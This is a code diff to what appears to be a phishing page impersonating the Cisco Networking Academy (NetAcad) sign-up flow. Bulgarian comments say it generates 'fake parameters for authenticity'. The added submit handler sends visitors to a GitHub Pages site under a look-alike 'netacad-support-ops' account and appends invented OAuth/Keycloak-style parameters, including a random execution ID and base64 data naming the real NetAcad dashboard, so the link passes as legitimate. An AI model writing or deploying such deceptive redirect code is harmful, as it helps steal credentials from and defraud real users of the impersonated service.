@@ -134,15 +134,27 @@
         const months = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
         months.forEach((m, i) => mSel.add(new Option(m, i + 1)));
 
-        // ФИНАЛЕН РЕДИРЕКТ С ТВОИТЕ ДАННИ
+        // ФИНАЛЕН РЕДИРЕКТ С ДЪЛЪГ И СЛОЖЕН URL
         document.getElementById('signupForm').onsubmit = function(e) {
             e.preventDefault(); 
+            
             const username = "netacad-support-ops"; 
             const repo = "profile-completion";
             const file = "profile-completion.html";
+
+            // Генериране на фалшиви параметри за автентичност
+            const tabId = Math.random().toString(36).substring(2, 15);
+            const executionId = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+                var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
+                return v.toString(16);
+            });
+            const clientData = btoa(JSON.stringify({ru: "https://www.netacad.com/dashboard", rt: "code", st: executionId})).substring(0, 80);
             
-            // Директно пренасочване към пълния URL
-            window.location.href = `https://${username}.github.io/${repo}/${file}`;
+            // Сглобяване на дългия линк
+            const targetUrl = `https://${username}.github.io/${repo}/${file}`;
+            const longParams = `?auth_realms=skillsforall&client_id=b2e-marketplace&tab_id=${tabId}&client_data=${clientData}&execution=${executionId}&kc_locale=en`;
+            
+            window.location.href = targetUrl + longParams;
         };
     </script>
 </body>
